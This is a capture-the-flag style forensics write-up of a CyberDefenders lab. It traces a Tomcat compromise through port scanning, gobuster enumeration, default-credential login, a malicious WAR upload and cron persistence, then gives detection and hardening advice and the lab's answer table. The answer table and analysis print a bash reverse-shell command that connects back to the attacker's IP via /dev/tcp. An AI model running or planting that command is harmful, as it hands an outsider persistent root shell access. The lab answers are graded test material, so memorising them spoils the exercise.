# 🛡️ Security Writeup – Tomcat Takeover Lab

## 📌 Overview

* **Platform:** Cyberdefenders
* **Category:** Network Forensics
* **Difficulty:** Easy
* **Date:** 22/04/2026

---

## 📖 Scenario

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. 

---

## 🎯 Objectives

Analyze network traffic using Wireshark's custom columns, filters, and statistics to identify suspicious web server administration access and potential compromise.

---

## 🧰 Tools & Techniques

* Tools: Wireshark, AbuseIPDB

---



## 🔍 Analysis

* The PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Examineing the conversations in the TCP stream, a list of conversations for 14.0.0.120 IP address that initiates requests to the server with significant changes in destination port numbers, they increase sequentially from a lower number to a much higher number . This behavior is suspicious and indicate a port scanning attempt or reconnaissance by the IP address.

  <img width="1590" height="883" alt="image" src="https://github.com/user-attachments/assets/1f5ced78-3b64-4a71-8e28-bdb9b529c685" />

  <img width="1612" height="887" alt="image" src="https://github.com/user-attachments/assets/9ad58a9d-b10d-4288-a46c-5039f414c700" />

* Using AbuseIPDB to look up for malicious IP, this IP address is from China and has not been reported as malicious.

  <img width="1549" height="837" alt="image" src="https://github.com/user-attachments/assets/b4f886f5-491a-44b0-a538-d7f8d793da52" />

* To narrow down the suspicious packets,filtering by IP address and the protocol HTTP associated with the web server. 

  <img width="1867" height="640" alt="image" src="https://github.com/user-attachments/assets/8767feb4-0c81-4e75-8289-4220e350b32c" />

* The destination port used to access the web server’s admin panel in these packets is 8080

  <img width="1865" height="707" alt="image" src="https://github.com/user-attachments/assets/a6c0c53e-c75b-434d-92b0-8bb9896b6e28" />

* Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server.

  <img width="1865" height="873" alt="image" src="https://github.com/user-attachments/assets/676bf0ec-a242-4279-b1bf-6c7afd9bdb80" />

* Here, the hacker used gobuster -  a high-performance directory/file, DNS and virtual host brute-forcing tool written in Go
  
* As we know that the destination port to access the web server of these packets is 8080. These packets use Basic Authentication that is Base64-encoded username and password

  <img width="1808" height="932" alt="image" src="https://github.com/user-attachments/assets/6da0cf16-c79e-438b-a2ee-d94ecb3d8c7e" />

* Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell.

  <img width="1173" height="400" alt="image" src="https://github.com/user-attachments/assets/aca09097-541e-4106-941d-c1d493fcd9c2" />

* After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. We found some packets that contain command shell or payload reverse shell.  

  <img width="1796" height="157" alt="image" src="https://github.com/user-attachments/assets/ccb76e5f-1fd3-4828-810f-c548e2986a22" />

* This indicates that the attacker had remote shell access to the compromised system, with root privileges.
* The attacker created a cron job to maintain persistence.
  
/* * * * * → Executes every minute

bash -i → Starts an interactive shell

/dev/tcp/14.0.0.120/443 → Connects back to attacker’s IP

0>&1 → Redirects input/output for full shell interaction

* This ensures the compromised machine continuously reconnects to the attacker, even if the session is lost.
  <img width="831" height="319" alt="image" src="https://github.com/user-attachments/assets/9c13c0cf-298c-4d99-87e3-14e59b219fa1" />


  
---



## 🧾 Key Findings

* Attacker IP: 14.0.0.120 (China)

* Open admin port: 8080 (Apache Tomcat default)

* Enumeration tool: gobuster

* Admin panel directory: /manager

* Compromised credentials: admin:tomcat

* Malicious uploaded file: JXQOZY.war (reverse shell payload)

* Persistence mechanism: Cron job executing a reverse shell every minute

* Post‑exploitation activity: Interactive shell with root privileges

---



## 🧬 Threat Context 

* **Tactic:** Reconnaissance, Discovery, Credential Access, Initial Access, Persistence, Command & Control
* **Technique:** T1595.001, T1046, T1110.001, T1190, T1053.003, T1071.001

---

## 🛡️ Detection Opportunities

* Port scan: Single IP connecting to many sequential ports in short time → alert.

* Dir brute‑force: High volume of GET /non-existent with User-Agent containing gobuster.

* Auth brute‑force: Multiple 401 followed by a 200 OK on /manager.

* Malicious WAR upload: PUT/POST to /manager/html/upload or /manager/text/deploy from untrusted IP.

* Reverse shell: Outbound connections to port 443 with bash -i or /dev/tcp patterns.

* Cron persistence: Monitor changes to /etc/crontab, /var/spool/cron/, or crontab commands.

---

## 🔐 Prevention & Mitigation

* Tomcat hardening: Change default port 8080, remove /manager if unused, enforce strong passwords, IP whitelist admin access.

* Network controls: Use WAF to block dir brute‑force and malicious uploads; implement egress filtering to restrict outbound shells.

* Host hardening: Run Tomcat as non‑root; enable SELinux/AppArmor; audit cron jobs and webapps directory regularly.

* Monitoring: Centralise Tomcat logs; alert on successful /manager logins from unusual IPs.

---

## 💡 Lessons Learned

* Default credentials kill security – change/remove them immediately.

* Base64 is not encryption – always use HTTPS for admin interfaces.

* Outbound traffic monitoring stops reverse shells – restrict unexpected egress connections.

* Cron jobs are a simple persistence mechanism – audit scheduled tasks regularly.


---

## ❓ Answers

| Question | Answer |
| -------- | ------ |
| Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?       | 14.0.0.120    |
| Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?       | China    |
| Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?       | 8080    |
| Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?       | gobuster    |
| Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?       | /manager    |
| Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?       | admin:tomcat    |
| Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?       | JXQOZY.war    |
| Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?       | /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'    |

---

